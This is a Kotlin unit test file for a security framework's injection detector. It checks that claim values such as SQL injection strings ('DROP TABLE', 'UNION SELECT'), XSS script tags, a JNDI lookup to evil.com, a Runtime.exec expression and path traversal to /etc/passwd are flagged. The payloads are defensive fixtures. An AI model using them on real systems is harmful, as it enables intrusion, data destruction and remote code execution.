package com.axians.eaf.framework.security

import com.axians.eaf.framework.core.exceptions.EafException
import org.assertj.core.api.Assertions.assertThat
import org.junit.jupiter.api.Test
import org.junit.jupiter.api.assertDoesNotThrow
import org.junit.jupiter.api.assertThrows

/**
 * Unit tests for InjectionDetector.
 *
 * Migrated from Kotest to JUnit 6 on 2025-11-20
 */
class InjectionDetectorTest {

    private val detector = InjectionDetector()

    // SQL Injection Patterns

    @Test
    fun `should detect SQL injection with --`() {
        val claims = mapOf("username" to "admin' --")
        val exception = assertThrows<InjectionDetectedException> { detector.scan(claims) }
        assertThat(exception.claim).contains("username")
        assertThat(exception.detectedPattern).contains("--")
    }

    @Test
    fun `should detect SQL injection with semicolon`() {
        val claims = mapOf("username" to "admin'; DROP TABLE users;")
        val exception = assertThrows<InjectionDetectedException> { detector.scan(claims) }
        assertThat(exception.claim).contains("username")
        assertThat(exception.detectedPattern).contains(";")
    }

    @Test
    fun `should detect SQL injection with UNION SELECT`() {
        val claims = mapOf("username" to "admin' UNION SELECT null, null, password FROM users--")
        val exception = assertThrows<InjectionDetectedException> { detector.scan(claims) }
        assertThat(exception.claim).contains("username")
        // Any SQL pattern match is sufficient
    }

    @Test
    fun `should not flag legitimate text like O'Malley`() {
        val claims = mapOf("name" to "O'Malley")
        assertDoesNotThrow { detector.scan(claims) }
    }

    // XSS Patterns

    @Test
    fun `should detect XSS with script tag`() {
        val claims = mapOf("comment" to "<script>alert(1)</script>")
        val exception = assertThrows<InjectionDetectedException> { detector.scan(claims) }
        assertThat(exception.claim).contains("comment")
        // Any XSS pattern match is sufficient
    }

    @Test
    fun `should detect XSS with javascript protocol`() {
        val claims = mapOf("url" to "javascript:alert(1)")
        val exception = assertThrows<InjectionDetectedException> { detector.scan(claims) }
        assertThat(exception.claim).contains("url")
        assertThat(exception.detectedPattern).contains("javascript:")
    }

    // JNDI Injection Patterns

    @Test
    fun `should detect JNDI injection with jndi`() {
        val claims = mapOf("data" to "\${jndi:ldap://evil.com/a}")
        val exception = assertThrows<InjectionDetectedException> { detector.scan(claims) }
        assertThat(exception.claim).contains("data")
        // Any JNDI pattern match is sufficient
    }

    // Expression Language injection with ${...}

    @Test
    fun `should detect Expression Language injection with dollar brace`() {
        val claims = mapOf("message" to "Hello \${T(java.lang.Runtime).getRuntime().exec('calc')}")
        val exception = assertThrows<InjectionDetectedException> { detector.scan(claims) }
        assertThat(exception.claim).contains("message")
        // Any expression injection pattern match is sufficient
    }

    // Path Traversal Patterns

    @Test
    fun `should detect Path Traversal with forward slashes`() {
        val claims = mapOf("path" to "../../etc/passwd")
        val exception = assertThrows<InjectionDetectedException> { detector.scan(claims) }
        assertThat(exception.claim).contains("path")
        // Any path traversal pattern match is sufficient
    }

    @Test
    fun `should detect Path Traversal with backslashes`() {
        val claims = mapOf("path" to "..\\..\\windows\\win.ini")
        val exception = assertThrows<InjectionDetectedException> { detector.scan(claims) }
        assertThat(exception.claim).contains("path")
        // Any path traversal pattern match is sufficient
    }

    // Safe Claim Values

    @Test
    fun `should not flag safe strings`() {
        val claims = mapOf(
            "username" to "john.doe",
            "email" to "john.doe@example.com",
            "description" to "This is a normal description.",
        )
        assertDoesNotThrow { detector.scan(claims) }
    }

    @Test
    fun `should handle non-string claims gracefully`() {
        val claims = mapOf(
            "userId" to 123,
            "isAdmin" to true,
        )
        assertDoesNotThrow { detector.scan(claims) }
    }

    // InjectionDetectedException

    @Test
    fun `should extend EafException`() {
        val exception = InjectionDetectedException("claim", "pattern", "value")
        assertThat(exception).isInstanceOf(EafException::class.java)
    }
}
